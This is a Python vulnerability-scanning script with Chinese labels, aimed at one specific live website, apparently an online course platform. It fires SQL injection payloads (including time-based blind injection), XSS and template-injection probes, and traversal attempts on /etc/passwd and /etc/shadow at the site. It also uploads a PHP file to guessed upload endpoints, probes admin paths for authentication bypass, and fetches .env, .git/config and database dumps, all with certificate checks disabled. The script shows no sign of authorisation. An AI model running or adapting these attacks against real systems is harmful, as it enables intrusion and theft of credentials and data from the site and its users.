import httpx, sys, time
sys.stdout.reconfigure(encoding='utf-8')
httpx.packages.urllib3.disable_warnings()

BASE_URL = 'https://cdcas.suwankj.com'

print("="*80)
print("深度安全测试")
print("="*80)

# 1. SQL 注入测试
print("\n【1. SQL 注入测试】")
print("-"*40)

sqli_payloads = [
    ("username=admin'--&password=test", "SQL语法错误"),
    ("username=admin' OR '1'='1&password=test", "恒真条件"),
    ("username=admin' UNION SELECT 1--&password=test", "UNION注入"),
    ("username=admin'; WAITFOR DELAY '0:0:5'--&password=test", "时间盲注"),
]

for payload, desc in sqli_payloads:
    try:
        start = time.time()
        resp = httpx.post(f"{BASE_URL}/user/login",
                           data=payload,
                           headers={'Content-Type': 'application/x-www-form-urlencoded'},
                           timeout=10,
                           verify=False)
        elapsed = time.time() - start

        # 检查是否有SQL错误信息
        sql_errors = ['sql', 'mysql', 'syntax', 'query', 'database', 'ora-', 'postgresql']
        found = [err for err in sql_errors if err in resp.text.lower()]

        if found:
            print(f"  [!] {desc}: 发现SQL错误关键词 - {found}")
        elif elapsed > 5:
            print(f"  [!] {desc}: 响应延迟 {elapsed:.2f}s (可能存在时间盲注)")
        else:
            print(f"  [+] {desc}: 未发现明显漏洞")
    except Exception as e:
        print(f"  [-] {desc}: 测试失败 - {e}")

# 2. XSS 测试
print("\n【2. XSS 测试】")
print("-"*40)

xss_payloads = [
    ('<script>alert(1)</script>', '反射型XSS'),
    ('"><img src=x onerror=alert(1)>', 'HTML注入'),
    ("javascript:alert(1)", 'JavaScript协议'),
    ("{{7*7}}", '模板注入'),
]

test_urls = [
    f"{BASE_URL}/search?q=",
    f"{BASE_URL}/course?keyword=",
    f"{BASE_URL}/user/login?redirect=",
]

for payload, desc in xss_payloads:
    for url in test_urls:
        try:
            resp = httpx.get(f"{url}{payload}", timeout=10, verify=False)
            if payload in resp.text:
                print(f"  [!] {desc}: Payload在响应中未过滤 - {url}")
                break
        except:
            pass
    else:
        print(f"  [+] {desc}: 未发现明显漏洞")

# 3. 目录遍历测试
print("\n【3. 目录遍历测试】")
print("-"*40)

traversal_payloads = [
    ("../../etc/passwd", "Linux密码文件"),
    ("../../etc/shadow", "Linux影子密码"),
    ("../../windows/win.ini", "Windows配置文件"),
    ("....//....//etc/passwd", "双写绕过"),
    ("%2e%2e%2f%2e%2e%2fetc/passwd", "URL编码绕过"),
]

for payload, desc in traversal_payloads:
    try:
        resp = httpx.get(f"{BASE_URL}/static/{payload}", timeout=10, verify=False, follow_redirects=False)
        if 'root:' in resp.text or '[boot loader]' in resp.text:
            print(f"  [!] {desc}: 发现目录遍历漏洞!")
        elif resp.status_code == 200 and len(resp.text) > 100:
            print(f"  [?] {desc}: 返回200，需人工检查")
        else:
            print(f"  [+] {desc}: 未发现漏洞")
    except:
        print(f"  [-] {desc}: 测试失败")

# 4. 文件上传测试
print("\n【4. 文件上传测试】")
print("-"*40)

upload_paths = [
    '/upload',
    '/api/upload',
    '/user/avatar',
    '/admin/upload',
    '/editor/upload',
]

for path in upload_paths:
    try:
        # 测试上传接口是否存在
        resp = httpx.get(f"{BASE_URL}{path}", timeout=10, verify=False, follow_redirects=False)
        if resp.status_code in [200, 302, 405]:
            print(f"  [?] {path}: 存在上传接口 (状态码: {resp.status_code})")

            # 测试文件类型限制
            files = {'file': ('test.php', '<?php echo "test"; ?>', 'application/x-php')}
            resp2 = httpx.post(f"{BASE_URL}{path}", files=files, timeout=10, verify=False)
            if 'success' in resp2.text.lower() or resp2.status_code == 200:
                print(f"  [!] {path}: 可能存在文件上传漏洞!")
        else:
            print(f"  [+] {path}: 接口不存在")
    except:
        print(f"  [-] {path}: 测试失败")

# 5. 认证绕过测试
print("\n【5. 认证绕过测试】")
print("-"*40)

admin_paths = [
    '/admin',
    '/admin/dashboard',
    '/admin/index',
    '/manage',
    '/system',
    '/config',
    '/debug',
]

for path in admin_paths:
    try:
        resp = httpx.get(f"{BASE_URL}{path}", timeout=10, verify=False, follow_redirects=False)

        if resp.status_code == 200:
            # 检查是否真的可以访问
            if 'login' in resp.text.lower() or '登录' in resp.text:
                print(f"  [+] {path}: 需要登录 (正常)")
            elif 'admin' in resp.text.lower() or '管理' in resp.text:
                print(f"  [!] {path}: 可能存在认证绕过!")
            else:
                print(f"  [?] {path}: 返回200，需人工检查")
        elif resp.status_code == 302:
            location = resp.headers.get('Location', '')
            if 'login' in location:
                print(f"  [+] {path}: 重定向到登录页 (正常)")
            else:
                print(f"  [?] {path}: 重定向到 {location}")
        else:
            print(f"  [+] {path}: 状态码 {resp.status_code}")
    except:
        print(f"  [-] {path}: 测试失败")

# 6. API 安全测试
print("\n【6. API 安全测试】")
print("-"*40)

api_endpoints = [
    '/api/v1/user',
    '/api/v1/course',
    '/api/v1/admin',
    '/api/v2/user',
    '/service/sign',
    '/user/online',
]

for endpoint in api_endpoints:
    try:
        # 测试未授权访问
        resp = httpx.get(f"{BASE_URL}{endpoint}", timeout=10, verify=False)

        if resp.status_code == 200:
            try:
                data = resp.json()
                if data.get('status') is not None:
                    print(f"  [?] {endpoint}: 返回JSON - {list(data.keys())[:5]}")
                else:
                    print(f"  [!] {endpoint}: 可能存在未授权访问!")
            except:
                print(f"  [?] {endpoint}: 返回非JSON数据")
        elif resp.status_code == 401:
            print(f"  [+] {endpoint}: 需要认证 (正常)")
        elif resp.status_code == 403:
            print(f"  [+] {endpoint}: 禁止访问 (正常)")
        else:
            print(f"  [+] {endpoint}: 状态码 {resp.status_code}")
    except:
        print(f"  [-] {endpoint}: 测试失败")

# 7. HTTP 方法测试
print("\n【7. HTTP 方法测试】")
print("-"*40)

methods = ['OPTIONS', 'PUT', 'DELETE', 'PATCH', 'TRACE']

for method in methods:
    try:
        resp = httpx.request(method, f"{BASE_URL}/", timeout=10, verify=False)
        if resp.status_code not in [405, 403, 501]:
            print(f"  [!] {method}: 状态码 {resp.status_code} (可能存在方法绕过)")
        else:
            print(f"  [+] {method}: 状态码 {resp.status_code} (正常)")
    except:
        print(f"  [-] {method}: 测试失败")

# 8. 敏感信息泄露
print("\n【8. 敏感信息泄露】")
print("-"*40)

sensitive_files = [
    '/.env',
    '/.git/config',
    '/.git/HEAD',
    '/composer.json',
    '/package.json',
    '/phpinfo.php',
    '/info.php',
    '/test.php',
    '/debug.log',
    '/error.log',
    '/access.log',
    '/backup.sql',
    '/database.sql',
    '/dump.sql',
]

for file in sensitive_files:
    try:
        resp = httpx.get(f"{BASE_URL}{file}", timeout=10, verify=False, follow_redirects=False)
        if resp.status_code == 200 and len(resp.text) > 50:
            # 检查是否是真实文件
            if 'DB_PASSWORD' in resp.text or 'APP_KEY' in resp.text:
                print(f"  [!] {file}: 发现敏感配置文件!")
            elif 'CREATE TABLE' in resp.text or 'INSERT INTO' in resp.text:
                print(f"  [!] {file}: 发现数据库备份!")
            elif '<?php' in resp.text or 'phpinfo' in resp.text:
                print(f"  [!] {file}: 发现PHP文件!")
            else:
                print(f"  [?] {file}: 返回200 ({len(resp.text)} bytes)")
        else:
            print(f"  [+] {file}: 状态码 {resp.status_code}")
    except:
        print(f"  [-] {file}: 测试失败")

print("\n" + "="*80)
print("测试完成")
print("="*80)
